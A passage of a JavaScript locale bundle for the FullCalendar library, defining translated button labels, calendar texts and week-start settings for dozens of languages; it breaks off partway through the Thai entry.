[].push.apply(FullCalendar.globalLocales, function () {
  'use strict';

  var l0 = {
    code: 'af',
    week: {
      dow: 1, // Maandag is die eerste dag van die week.
      doy: 4, // Die week wat die 4de Januarie bevat is die eerste week van die jaar.
    },
    buttonText: {
      prev: 'Vorige',
      next: 'Volgende',
      today: 'Vandag',
      year: 'Jaar',
      month: 'Maand',
      week: 'Week',
      day: 'Dag',
      list: 'Agenda',
    },
    allDayText: 'Heeldag',
    moreLinkText: 'Addisionele',
    noEventsText: 'Daar is geen gebeurtenisse nie',
  };

  var l1 = {
    code: 'ar-dz',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 4, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l2 = {
    code: 'ar-kw',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l3 = {
    code: 'ar-ly',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l4 = {
    code: 'ar-ma',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l5 = {
    code: 'ar-sa',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 6, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l6 = {
    code: 'ar-tn',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l7 = {
    code: 'ar',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l8 = {
    code: 'az',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Əvvəl',
      next: 'Sonra',
      today: 'Bu Gün',
      month: 'Ay',
      week: 'Həftə',
      day: 'Gün',
      list: 'Gündəm',
    },
    weekText: 'Həftə',
    allDayText: 'Bütün Gün',
    moreLinkText: function(n) {
      return '+ daha çox ' + n
    },
    noEventsText: 'Göstərmək üçün hadisə yoxdur',
  };

  var l9 = {
    code: 'bg',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'назад',
      next: 'напред',
      today: 'днес',
      month: 'Месец',
      week: 'Седмица',
      day: 'Ден',
      list: 'График',
    },
    allDayText: 'Цял ден',
    moreLinkText: function(n) {
      return '+още ' + n
    },
    noEventsText: 'Няма събития за показване',
  };

  var l10 = {
    code: 'bs',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Prošli',
      next: 'Sljedeći',
      today: 'Danas',
      month: 'Mjesec',
      week: 'Sedmica',
      day: 'Dan',
      list: 'Raspored',
    },
    weekText: 'Sed',
    allDayText: 'Cijeli dan',
    moreLinkText: function(n) {
      return '+ još ' + n
    },
    noEventsText: 'Nema događaja za prikazivanje',
  };

  var l11 = {
    code: 'ca',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Anterior',
      next: 'Següent',
      today: 'Avui',
      month: 'Mes',
      week: 'Setmana',
      day: 'Dia',
      list: 'Agenda',
    },
    weekText: 'Set',
    allDayText: 'Tot el dia',
    moreLinkText: 'més',
    noEventsText: 'No hi ha esdeveniments per mostrar',
  };

  var l12 = {
    code: 'cs',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Dříve',
      next: 'Později',
      today: 'Nyní',
      month: 'Měsíc',
      week: 'Týden',
      day: 'Den',
      list: 'Agenda',
    },
    weekText: 'Týd',
    allDayText: 'Celý den',
    moreLinkText: function(n) {
      return '+další: ' + n
    },
    noEventsText: 'Žádné akce k zobrazení',
  };

  var l13 = {
    code: 'cy',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Blaenorol',
      next: 'Nesaf',
      today: 'Heddiw',
      year: 'Blwyddyn',
      month: 'Mis',
      week: 'Wythnos',
      day: 'Dydd',
      list: 'Rhestr',
    },
    weekText: 'Wythnos',
    allDayText: 'Trwy\'r dydd',
    moreLinkText: 'Mwy',
    noEventsText: 'Dim digwyddiadau',
  };

  var l14 = {
    code: 'da',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Forrige',
      next: 'Næste',
      today: 'I dag',
      month: 'Måned',
      week: 'Uge',
      day: 'Dag',
      list: 'Agenda',
    },
    weekText: 'Uge',
    allDayText: 'Hele dagen',
    moreLinkText: 'flere',
    noEventsText: 'Ingen arrangementer at vise',
  };

  var l15 = {
    code: 'de-at',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Zurück',
      next: 'Vor',
      today: 'Heute',
      year: 'Jahr',
      month: 'Monat',
      week: 'Woche',
      day: 'Tag',
      list: 'Terminübersicht',
    },
    weekText: 'KW',
    allDayText: 'Ganztägig',
    moreLinkText: function(n) {
      return '+ weitere ' + n
    },
    noEventsText: 'Keine Ereignisse anzuzeigen',
  };

  var l16 = {
    code: 'de',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Zurück',
      next: 'Vor',
      today: 'Heute',
      year: 'Jahr',
      month: 'Monat',
      week: 'Woche',
      day: 'Tag',
      list: 'Terminübersicht',
    },
    weekText: 'KW',
    allDayText: 'Ganztägig',
    moreLinkText: function(n) {
      return '+ weitere ' + n
    },
    noEventsText: 'Keine Ereignisse anzuzeigen',
  };

  var l17 = {
    code: 'el',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4st is the first week of the year.
    },
    buttonText: {
      prev: 'Προηγούμενος',
      next: 'Επόμενος',
      today: 'Σήμερα',
      month: 'Μήνας',
      week: 'Εβδομάδα',
      day: 'Ημέρα',
      list: 'Ατζέντα',
    },
    weekText: 'Εβδ',
    allDayText: 'Ολοήμερο',
    moreLinkText: 'περισσότερα',
    noEventsText: 'Δεν υπάρχουν γεγονότα προς εμφάνιση',
  };

  var l18 = {
    code: 'en-au',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
  };

  var l19 = {
    code: 'en-gb',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
  };

  var l20 = {
    code: 'en-nz',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
  };

  var l21 = {
    code: 'eo',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Antaŭa',
      next: 'Sekva',
      today: 'Hodiaŭ',
      month: 'Monato',
      week: 'Semajno',
      day: 'Tago',
      list: 'Tagordo',
    },
    weekText: 'Sm',
    allDayText: 'Tuta tago',
    moreLinkText: 'pli',
    noEventsText: 'Neniuj eventoj por montri',
  };

  var l22 = {
    code: 'es',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 6, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Ant',
      next: 'Sig',
      today: 'Hoy',
      month: 'Mes',
      week: 'Semana',
      day: 'Día',
      list: 'Agenda',
    },
    weekText: 'Sm',
    allDayText: 'Todo el día',
    moreLinkText: 'más',
    noEventsText: 'No hay eventos para mostrar',
  };

  var l23 = {
    code: 'es',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Ant',
      next: 'Sig',
      today: 'Hoy',
      month: 'Mes',
      week: 'Semana',
      day: 'Día',
      list: 'Agenda',
    },
    weekText: 'Sm',
    allDayText: 'Todo el día',
    moreLinkText: 'más',
    noEventsText: 'No hay eventos para mostrar',
  };

  var l24 = {
    code: 'et',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Eelnev',
      next: 'Järgnev',
      today: 'Täna',
      month: 'Kuu',
      week: 'Nädal',
      day: 'Päev',
      list: 'Päevakord',
    },
    weekText: 'näd',
    allDayText: 'Kogu päev',
    moreLinkText: function(n) {
      return '+ veel ' + n
    },
    noEventsText: 'Kuvamiseks puuduvad sündmused',
  };

  var l25 = {
    code: 'eu',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Aur',
      next: 'Hur',
      today: 'Gaur',
      month: 'Hilabetea',
      week: 'Astea',
      day: 'Eguna',
      list: 'Agenda',
    },
    weekText: 'As',
    allDayText: 'Egun osoa',
    moreLinkText: 'gehiago',
    noEventsText: 'Ez dago ekitaldirik erakusteko',
  };

  var l26 = {
    code: 'fa',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'قبلی',
      next: 'بعدی',
      today: 'امروز',
      month: 'ماه',
      week: 'هفته',
      day: 'روز',
      list: 'برنامه',
    },
    weekText: 'هف',
    allDayText: 'تمام روز',
    moreLinkText: function(n) {
      return 'بیش از ' + n
    },
    noEventsText: 'هیچ رویدادی به نمایش',
  };

  var l27 = {
    code: 'fi',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Edellinen',
      next: 'Seuraava',
      today: 'Tänään',
      month: 'Kuukausi',
      week: 'Viikko',
      day: 'Päivä',
      list: 'Tapahtumat',
    },
    weekText: 'Vk',
    allDayText: 'Koko päivä',
    moreLinkText: 'lisää',
    noEventsText: 'Ei näytettäviä tapahtumia',
  };

  var l28 = {
    code: 'fr',
    buttonText: {
      prev: 'Précédent',
      next: 'Suivant',
      today: "Aujourd'hui",
      year: 'Année',
      month: 'Mois',
      week: 'Semaine',
      day: 'Jour',
      list: 'Mon planning',
    },
    weekText: 'Sem.',
    allDayText: 'Toute la journée',
    moreLinkText: 'en plus',
    noEventsText: 'Aucun événement à afficher',
  };

  var l29 = {
    code: 'fr-ch',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Précédent',
      next: 'Suivant',
      today: 'Courant',
      year: 'Année',
      month: 'Mois',
      week: 'Semaine',
      day: 'Jour',
      list: 'Mon planning',
    },
    weekText: 'Sm',
    allDayText: 'Toute la journée',
    moreLinkText: 'en plus',
    noEventsText: 'Aucun événement à afficher',
  };

  var l30 = {
    code: 'fr',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Précédent',
      next: 'Suivant',
      today: "Aujourd'hui",
      year: 'Année',
      month: 'Mois',
      week: 'Semaine',
      day: 'Jour',
      list: 'Planning',
    },
    weekText: 'Sem.',
    allDayText: 'Toute la journée',
    moreLinkText: 'en plus',
    noEventsText: 'Aucun événement à afficher',
  };

  var l31 = {
    code: 'gl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Ant',
      next: 'Seg',
      today: 'Hoxe',
      month: 'Mes',
      week: 'Semana',
      day: 'Día',
      list: 'Axenda',
    },
    weekText: 'Sm',
    allDayText: 'Todo o día',
    moreLinkText: 'máis',
    noEventsText: 'Non hai eventos para amosar',
  };

  var l32 = {
    code: 'he',
    direction: 'rtl',
    buttonText: {
      prev: 'הקודם',
      next: 'הבא',
      today: 'היום',
      month: 'חודש',
      week: 'שבוע',
      day: 'יום',
      list: 'סדר יום',
    },
    allDayText: 'כל היום',
    moreLinkText: 'אחר',
    noEventsText: 'אין אירועים להצגה',
    weekText: 'שבוע',
  };

  var l33 = {
    code: 'hi',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 6, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'पिछला',
      next: 'अगला',
      today: 'आज',
      month: 'महीना',
      week: 'सप्ताह',
      day: 'दिन',
      list: 'कार्यसूची',
    },
    weekText: 'हफ्ता',
    allDayText: 'सभी दिन',
    moreLinkText: function(n) {
      return '+अधिक ' + n
    },
    noEventsText: 'कोई घटनाओं को प्रदर्शित करने के लिए',
  };

  var l34 = {
    code: 'hr',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Prijašnji',
      next: 'Sljedeći',
      today: 'Danas',
      month: 'Mjesec',
      week: 'Tjedan',
      day: 'Dan',
      list: 'Raspored',
    },
    weekText: 'Tje',
    allDayText: 'Cijeli dan',
    moreLinkText: function(n) {
      return '+ još ' + n
    },
    noEventsText: 'Nema događaja za prikaz',
  };

  var l35 = {
    code: 'hu',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'vissza',
      next: 'előre',
      today: 'ma',
      month: 'Hónap',
      week: 'Hét',
      day: 'Nap',
      list: 'Napló',
    },
    weekText: 'Hét',
    allDayText: 'Egész nap',
    moreLinkText: 'további',
    noEventsText: 'Nincs megjeleníthető esemény',
  };

  var l36 = {
    code: 'hy-am',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Նախորդ',
      next: 'Հաջորդ',
      today: 'Այսօր',
      month: 'Ամիս',
      week: 'Շաբաթ',
      day: 'Օր',
      list: 'Օրվա ցուցակ',
    },
    weekText: 'Շաբ',
    allDayText: 'Ամբողջ օր',
    moreLinkText: function(n) {
      return '+ ևս ' + n
    },
    noEventsText: 'Բացակայում է իրադարձությունը ցուցադրելու',
  };

  var l37 = {
    code: 'id',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'mundur',
      next: 'maju',
      today: 'hari ini',
      month: 'Bulan',
      week: 'Minggu',
      day: 'Hari',
      list: 'Agenda',
    },
    weekText: 'Mg',
    allDayText: 'Sehari penuh',
    moreLinkText: 'lebih',
    noEventsText: 'Tidak ada acara untuk ditampilkan',
  };

  var l38 = {
    code: 'is',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Fyrri',
      next: 'Næsti',
      today: 'Í dag',
      month: 'Mánuður',
      week: 'Vika',
      day: 'Dagur',
      list: 'Dagskrá',
    },
    weekText: 'Vika',
    allDayText: 'Allan daginn',
    moreLinkText: 'meira',
    noEventsText: 'Engir viðburðir til að sýna',
  };

  var l39 = {
    code: 'it',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Prec',
      next: 'Succ',
      today: 'Oggi',
      month: 'Mese',
      week: 'Settimana',
      day: 'Giorno',
      list: 'Agenda',
    },
    weekText: 'Sm',
    allDayText: 'Tutto il giorno',
    moreLinkText: function(n) {
      return '+altri ' + n
    },
    noEventsText: 'Non ci sono eventi da visualizzare',
  };

  var l40 = {
    code: 'ja',
    buttonText: {
      prev: '前',
      next: '次',
      today: '今日',
      month: '月',
      week: '週',
      day: '日',
      list: '予定リスト',
    },
    weekText: '週',
    allDayText: '終日',
    moreLinkText: function(n) {
      return '他 ' + n + ' 件'
    },
    noEventsText: '表示する予定はありません',
  };

  var l41 = {
    code: 'ka',
    week: {
      dow: 1,
      doy: 7,
    },
    buttonText: {
      prev: 'წინა',
      next: 'შემდეგი',
      today: 'დღეს',
      month: 'თვე',
      week: 'კვირა',
      day: 'დღე',
      list: 'დღის წესრიგი',
    },
    weekText: 'კვ',
    allDayText: 'მთელი დღე',
    moreLinkText: function(n) {
      return '+ კიდევ ' + n
    },
    noEventsText: 'ღონისძიებები არ არის',
  };

  var l42 = {
    code: 'kk',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Алдыңғы',
      next: 'Келесі',
      today: 'Бүгін',
      month: 'Ай',
      week: 'Апта',
      day: 'Күн',
      list: 'Күн тәртібі',
    },
    weekText: 'Не',
    allDayText: 'Күні бойы',
    moreLinkText: function(n) {
      return '+ тағы ' + n
    },
    noEventsText: 'Көрсету үшін оқиғалар жоқ',
  };

  var l43 = {
    code: 'ko',
    buttonText: {
      prev: '이전달',
      next: '다음달',
      today: '오늘',
      month: '월',
      week: '주',
      day: '일',
      list: '일정목록',
    },
    weekText: '주',
    allDayText: '종일',
    moreLinkText: '개',
    noEventsText: '일정이 없습니다',
  };

  var l44 = {
    code: 'lb',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Zréck',
      next: 'Weider',
      today: 'Haut',
      month: 'Mount',
      week: 'Woch',
      day: 'Dag',
      list: 'Terminiwwersiicht',
    },
    weekText: 'W',
    allDayText: 'Ganzen Dag',
    moreLinkText: 'méi',
    noEventsText: 'Nee Evenementer ze affichéieren',
  };

  var l45 = {
    code: 'lt',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Atgal',
      next: 'Pirmyn',
      today: 'Šiandien',
      month: 'Mėnuo',
      week: 'Savaitė',
      day: 'Diena',
      list: 'Darbotvarkė',
    },
    weekText: 'SAV',
    allDayText: 'Visą dieną',
    moreLinkText: 'daugiau',
    noEventsText: 'Nėra įvykių rodyti',
  };

  var l46 = {
    code: 'lv',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Iepr.',
      next: 'Nāk.',
      today: 'Šodien',
      month: 'Mēnesis',
      week: 'Nedēļa',
      day: 'Diena',
      list: 'Dienas kārtība',
    },
    weekText: 'Ned.',
    allDayText: 'Visu dienu',
    moreLinkText: function(n) {
      return '+vēl ' + n
    },
    noEventsText: 'Nav notikumu',
  };

  var l47 = {
    code: 'mk',
    buttonText: {
      prev: 'претходно',
      next: 'следно',
      today: 'Денес',
      month: 'Месец',
      week: 'Недела',
      day: 'Ден',
      list: 'График',
    },
    weekText: 'Сед',
    allDayText: 'Цел ден',
    moreLinkText: function(n) {
      return '+повеќе ' + n
    },
    noEventsText: 'Нема настани за прикажување',
  };

  var l48 = {
    code: 'ms',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Sebelum',
      next: 'Selepas',
      today: 'hari ini',
      month: 'Bulan',
      week: 'Minggu',
      day: 'Hari',
      list: 'Agenda',
    },
    weekText: 'Mg',
    allDayText: 'Sepanjang hari',
    moreLinkText: function(n) {
      return 'masih ada ' + n + ' acara'
    },
    noEventsText: 'Tiada peristiwa untuk dipaparkan',
  };

  var l49 = {
    code: 'nb',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Forrige',
      next: 'Neste',
      today: 'I dag',
      month: 'Måned',
      week: 'Uke',
      day: 'Dag',
      list: 'Agenda',
    },
    weekText: 'Uke',
    allDayText: 'Hele dagen',
    moreLinkText: 'til',
    noEventsText: 'Ingen hendelser å vise',
  };

  var l50 = {
    code: 'ne', // code for nepal
    week: {
      dow: 7, // Sunday is the first day of the week.
      doy: 1, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'अघिल्लो',
      next: 'अर्को',
      today: 'आज',
      month: 'महिना',
      week: 'हप्ता',
      day: 'दिन',
      list: 'सूची',
    },
    weekText: 'हप्ता',
    allDayText: 'दिनभरि',
    moreLinkText: 'थप लिंक',
    noEventsText: 'देखाउनको लागि कुनै घटनाहरू छैनन्',
  };

  var l51 = {
    code: 'nl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Vorige',
      next: 'Volgende',
      today: 'Vandaag',
      year: 'Jaar',
      month: 'Maand',
      week: 'Week',
      day: 'Dag',
      list: 'Agenda',
    },
    allDayText: 'Hele dag',
    moreLinkText: 'extra',
    noEventsText: 'Geen evenementen om te laten zien',
  };

  var l52 = {
    code: 'nn',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Førre',
      next: 'Neste',
      today: 'I dag',
      month: 'Månad',
      week: 'Veke',
      day: 'Dag',
      list: 'Agenda',
    },
    weekText: 'Veke',
    allDayText: 'Heile dagen',
    moreLinkText: 'til',
    noEventsText: 'Ingen hendelser å vise',
  };

  var l53 = {
    code: 'pl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Poprzedni',
      next: 'Następny',
      today: 'Dziś',
      month: 'Miesiąc',
      week: 'Tydzień',
      day: 'Dzień',
      list: 'Plan dnia',
    },
    weekText: 'Tydz',
    allDayText: 'Cały dzień',
    moreLinkText: 'więcej',
    noEventsText: 'Brak wydarzeń do wyświetlenia',
  };

  var l54 = {
    code: 'pt-br',
    buttonText: {
      prev: 'Anterior',
      next: 'Próximo',
      today: 'Hoje',
      month: 'Mês',
      week: 'Semana',
      day: 'Dia',
      list: 'Lista',
    },
    weekText: 'Sm',
    allDayText: 'dia inteiro',
    moreLinkText: function(n) {
      return 'mais +' + n
    },
    noEventsText: 'Não há eventos para mostrar',
  };

  var l55 = {
    code: 'pt',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Anterior',
      next: 'Seguinte',
      today: 'Hoje',
      month: 'Mês',
      week: 'Semana',
      day: 'Dia',
      list: 'Agenda',
    },
    weekText: 'Sem',
    allDayText: 'Todo o dia',
    moreLinkText: 'mais',
    noEventsText: 'Não há eventos para mostrar',
  };

  var l56 = {
    code: 'ro',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'precedentă',
      next: 'următoare',
      today: 'Azi',
      month: 'Lună',
      week: 'Săptămână',
      day: 'Zi',
      list: 'Agendă',
    },
    weekText: 'Săpt',
    allDayText: 'Toată ziua',
    moreLinkText: function(n) {
      return '+alte ' + n
    },
    noEventsText: 'Nu există evenimente de afișat',
  };

  var l57 = {
    code: 'ru',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Пред',
      next: 'След',
      today: 'Сегодня',
      month: 'Месяц',
      week: 'Неделя',
      day: 'День',
      list: 'Повестка дня',
    },
    weekText: 'Нед',
    allDayText: 'Весь день',
    moreLinkText: function(n) {
      return '+ ещё ' + n
    },
    noEventsText: 'Нет событий для отображения',
  };

  var l58 = {
    code: 'sk',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Predchádzajúci',
      next: 'Nasledujúci',
      today: 'Dnes',
      month: 'Mesiac',
      week: 'Týždeň',
      day: 'Deň',
      list: 'Rozvrh',
    },
    weekText: 'Ty',
    allDayText: 'Celý deň',
    moreLinkText: function(n) {
      return '+ďalšie: ' + n
    },
    noEventsText: 'Žiadne akcie na zobrazenie',
  };

  var l59 = {
    code: 'sl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Prejšnji',
      next: 'Naslednji',
      today: 'Trenutni',
      month: 'Mesec',
      week: 'Teden',
      day: 'Dan',
      list: 'Dnevni red',
    },
    weekText: 'Teden',
    allDayText: 'Ves dan',
    moreLinkText: 'več',
    noEventsText: 'Ni dogodkov za prikaz',
  };

  var l60 = {
    code: 'sq',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'mbrapa',
      next: 'Përpara',
      today: 'sot',
      month: 'Muaj',
      week: 'Javë',
      day: 'Ditë',
      list: 'Listë',
    },
    weekText: 'Ja',
    allDayText: 'Gjithë ditën',
    moreLinkText: function(n) {
      return '+më tepër ' + n
    },
    noEventsText: 'Nuk ka evente për të shfaqur',
  };

  var l61 = {
    code: 'sr-cyrl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Претходна',
      next: 'следећи',
      today: 'Данас',
      month: 'Месец',
      week: 'Недеља',
      day: 'Дан',
      list: 'Планер',
    },
    weekText: 'Сед',
    allDayText: 'Цео дан',
    moreLinkText: function(n) {
      return '+ још ' + n
    },
    noEventsText: 'Нема догађаја за приказ',
  };

  var l62 = {
    code: 'sr',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Prethodna',
      next: 'Sledeći',
      today: 'Danas',
      month: 'Mеsеc',
      week: 'Nеdеlja',
      day: 'Dan',
      list: 'Planеr',
    },
    weekText: 'Sed',
    allDayText: 'Cеo dan',
    moreLinkText: function(n) {
      return '+ još ' + n
    },
    noEventsText: 'Nеma događaja za prikaz',
  };

  var l63 = {
    code: 'sv',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Förra',
      next: 'Nästa',
      today: 'Idag',
      month: 'Månad',
      week: 'Vecka',
      day: 'Dag',
      list: 'Program',
    },
    weekText: 'v.',
    allDayText: 'Heldag',
    moreLinkText: 'till',
    noEventsText: 'Inga händelser att visa',
  };

  var l64 = {
    code: 'ta-in',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'முந்தைய',
      next: 'அடுத்தது',
      today: 'இன்று',
      month: 'மாதம்',
      week: 'சனிக்கிழமை',
      day: 'நாள்',
      list: 'தினசரி கதை',
    },
    weekText: 'வார',
    allDayText: 'நாள் முழுவதும்',
    moreLinkText: function(n) {
      return '+ மேலும் ' + n
    },
    noEventsText: 'நிகழ்வைக் காட்டவில்லை',
  };

  var l65 = {
    code: 'th',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'ก่อนหน้า',
      next: 'ถัดไป',
      prevYear: 'ปีก่อนหน้า',
      nextYear: 'ปีถัดไป',
      year: 'ปี',
      today: 'วันนี้',
